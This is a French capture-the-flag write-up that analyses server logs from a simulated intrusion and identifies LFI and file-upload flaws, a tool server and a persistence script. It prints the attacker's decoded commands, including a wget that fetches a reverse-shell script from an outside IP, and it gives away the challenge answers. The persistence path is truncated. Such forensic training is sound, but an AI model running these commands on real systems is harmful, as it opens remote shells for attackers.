Mission 2
=============

Enoncé 
---------
Brief de mission
~~~~~~~~~~~~~~~~~~~~~~~

L'organisation alliée Nuclear Punk ayant subi une attaque par l'entité nous a fourni ses logs afin de nous aider à comprendre les techniques utilisées par les attaquants.

Pour identifier le groupe attaquant, vous devez récupérer le CWE de la première vulnérabilité utilisée par l'attaquant, le CWE de la seconde vulnérabilité utilisée par l'attaquant, l'adresse IP du serveur sur lequel l'attaquant récupère ses outils ainsi que le chemin arbitraire du fichier permettant la persistance.

Exemple de données :
- CWE de la première vulnérabilité : SQL Injection -> CWE-89 ;
- CWE de la seconde vulnérabilité : Cross-Site Scripting -> CWE-79 ;
- IP : 13.37.13.37 ;
- Chemin du fichier : /etc/passwd ;

Format de validation : RM{CWE-89:CWE-79:13.37.13.37:/etc/passwd}

Objectifs de la mission
~~~~~~~~~~~~~~~~~~~~~~~
Analyser les logs via le SOC.
Identifier des indicateurs de compromission (IoC) et des indicateurs d'attaque (IoA).

Exploit 
-------------

Il y a deux types de logs : serveur apache et system

Première piste : 

- On cherche d'abord des traces d'exploitation sur le system pour définir l'heure à laquelle l'attaquant à accéder au serveur
- On trouve un fichier /root/0x0/pwn3d-by-nullv4stati0n.sh
- On cherche sa première occurrence : 00:37:34.938 (GG Ced)
- Ensuite on regarde ce qu'il se passe avant
- On voit qu'il y a du bruteforce sur le SSH avec l'IP 211.88.157.101, qui fait déjà du nmap et du fuzzing sur le serveur web
- On voit aussi des appels du serveur web a "base64"


Deuxième piste : 

    Avec un horaire autour de 00:37:34:938, et en cherchant "base64" on retrouve des traces très suspectes ! avec du ev1l.php.png et des commandes en base64
    On décode tous les bases 64:

```
d2hvYW1p == whoami
cHdk == pwd
cGluZyAtYyAxIGdvb2dsZS5jb20= == ping -c 1 google.com
Y3VybCBodHRwOi8vMTYzLjE3Mi42Ny4yMDE6NDk5OTkv == curl http://163.172.67.201:49999/
d2dldCBodHRwOi8vMTYzLjE3Mi42Ny4yMDE6NDk5OTkvczFtcGwzLXIzdnNoM2xsLXZwcy5zaA== == wget http://163.172.67.201:49999/s1mpl3-r3vsh3ll-vps.sh
Y2htb2QgK3ggczFtcGwzLXIzdnNoM2xsLXZwcy5zaA== == chmod +x s1mpl3-r3vsh3ll-vps.sh
```
Pas de doute, on tiens notre homme ! Son IP : 10.143.17.101
On regarde ce qu'il a fait avant, il y a des tentatives de "LFI" Local File Inclusion

Résumé :
------------
On a : 
- Local file inclusion : CWE-98
- Upload de fichier (.php.png) : CWE-434
- L'adresse IP du serveur : 163.172.67.201
- Le fichier de persistance : /root/0x0/pwn3d-by-nullv4stati0n.s